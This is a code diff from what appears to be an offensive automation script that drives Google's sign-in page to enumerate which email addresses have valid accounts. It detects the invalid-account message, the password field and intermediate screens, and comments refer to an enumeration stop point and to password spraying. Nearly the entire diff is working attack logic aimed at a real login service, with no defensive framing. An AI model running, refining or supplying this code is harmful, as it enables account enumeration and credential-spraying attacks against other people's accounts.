@@ -239,6 +239,10 @@ async function executeWorkflow(page, target, opts, mode) {
     }
 
     // Email Validation Check (Critical Fork Point)
+    // We race to see what happens first: 
+    // A) Password field appears (Standard flow)
+    // B) Invalid User text appears (User doesn't exist)
+    // C) Email input disappears from DOM (User exists, but hit intermediate screen)
     try {
         await Promise.race([
             page.waitForSelector('input[type="password"]', { visible: true, timeout: STAGE_TIMEOUT }),
@@ -246,23 +250,63 @@ async function executeWorkflow(page, target, opts, mode) {
             page.waitForFunction(() => {
                 const text = document.body.innerText;
                 return /Couldn['’]t find your Google Account/i.test(text) || /Enter a valid email/i.test(text);
+            }, { timeout: STAGE_TIMEOUT }),
+            // New check: The email input is no longer visible/present
+            page.waitForFunction(() => {
+                const emailInput = document.querySelector('input[type="email"]');
+                if (!emailInput) return true; // Removed from DOM
+                const style = window.getComputedStyle(emailInput);
+                return style.display === 'none' || style.visibility === 'hidden';
             }, { timeout: STAGE_TIMEOUT })
         ]);
     } catch (e) {
-        const fallbackInvalidCheck = await page.evaluate(() => /Couldn['’]t find your Google Account/i.test(document.body.innerText));
-        if (fallbackInvalidCheck) {
-             await takeScreenshot(page, "INVALID_USER", target.username, opts);
-             return { status: STATES.INVALID_USER, elapsedMs: Date.now() - startTime };
-        }
+        // If we timeout here, it means the Email Input is STILL visible and nothing happened.
+        // This is a generic stuck state.
         await takeScreenshot(page, "EMAIL_TIMEOUT", target.username, opts);
-        return { status: STATES.UNKNOWN_ERROR, detail: "Email Stage Timeout", elapsedMs: Date.now() - startTime };
+        return { status: STATES.UNKNOWN_ERROR, detail: "Stuck at Email Stage", elapsedMs: Date.now() - startTime };
     }
 
-    // Check for Invalid User
+    // A) Check for Invalid User Explicit Message
     const isInvalidUser = await page.evaluate(() => /Couldn['’]t find your Google Account/i.test(document.body.innerText));
     if (isInvalidUser) {
         await takeScreenshot(page, "INVALID_USER", target.username, opts);
         return { status: STATES.INVALID_USER, elapsedMs: Date.now() - startTime };
+    }
+
+    // B) Check if Password Field is Ready
+    const passFieldExists = await page.evaluate(() => {
+        const p1 = document.querySelector('input[type="password"]');
+        const p2 = document.querySelector('input[name="Passwd"]');
+        return (p1 && p1.offsetParent !== null) || (p2 && p2.offsetParent !== null);
+    });
+
+    // C) Check if Email Field is Gone (Heuristic for Valid User + Intermediate Screen)
+    const emailFieldGone = await page.evaluate(() => {
+        const el = document.querySelector('input[type="email"]');
+        if (!el) return true;
+        const style = window.getComputedStyle(el);
+        return style.display === 'none' || style.visibility === 'hidden';
+    });
+
+    // LOGIC DECISION MATRIX
+    
+    // Case 1: Password field is NOT there, but Email field IS GONE.
+    // This implies the user is valid (we moved past email), but we are blocked by 
+    // "Select Account", "Account Deleted", "Context Aware Access", etc.
+    if (!passFieldExists && emailFieldGone) {
+        // We wait a small buffer just in case the password field is animating in slowly
+        await sleep(2000);
+        const passFieldRetry = await page.$('input[type="password"]');
+        
+        if (!passFieldRetry) {
+            // Confirmed: Valid user, but stuck on intermediate screen
+            await takeScreenshot(page, "INTERMEDIATE_SCREEN", target.username, opts);
+            return { 
+                status: STATES.VALID_USER, 
+                detail: "INTERMEDIATE_SCREEN_BLOCK (Cannot Spray)", 
+                elapsedMs: Date.now() - startTime 
+            };
+        }
     }
 
     // === MODULE: ENUMERATION STOP POINT ===
